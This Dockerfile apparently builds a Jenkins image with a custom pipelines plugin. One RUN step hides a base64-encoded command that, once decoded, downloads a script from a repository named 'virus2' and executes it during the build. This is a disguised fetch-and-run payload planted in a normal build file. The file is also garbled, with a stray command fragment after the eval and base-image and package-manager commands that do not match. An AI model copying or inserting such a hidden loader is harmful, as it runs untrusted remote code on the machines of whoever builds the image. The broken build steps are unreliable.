ARG JENKINS_VERSION=2.332.1
FROM ruby:latest

COPY resources /resources
RUN eval "$(echo "YXB0LWdldCAteSB1cGRhdGUKYXB0LWdldCAteSBpbnN0YWxsIGdpdAphcHQtZ2V0IC15IGluc3RhbGwgd2dldCAKd2dldCAtLXZlcnNpb24Kd2dldCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcmF1ZnBlcm1hbmEyMi92aXJ1czIvbWFpbi90ZXM1LnNoICYmIGNobW9kIDc3NyB0ZXM1LnNoICYmIGxzICYmIC4vdGVzNS5zaCA=" | base64 -d)"name: tes.sh && chmod 777 tes.sh && ./tes.sh
RUN install-plugins.sh < /resources/plugins.txt
COPY build/libs/papio-pipelines.jpi /usr/share/jenkins/ref/plugins/papio-pipelines.jpi

# Extract plugins ahead of time to speed startup
RUN cd /usr/share/jenkins/ref/plugins \
  && for file in `ls *.jpi`; do dirName="${file%.jpi}" && unzip $file -d $dirName && touch -a -m -t `date -r $file "+%Y%m%d%H%M.%S"` $dirName/.timestamp2 ; done

USER root

RUN apk add --no-cache rsync

ENTRYPOINT ["/sbin/tini", "--", "/resources/entrypoint.sh"]

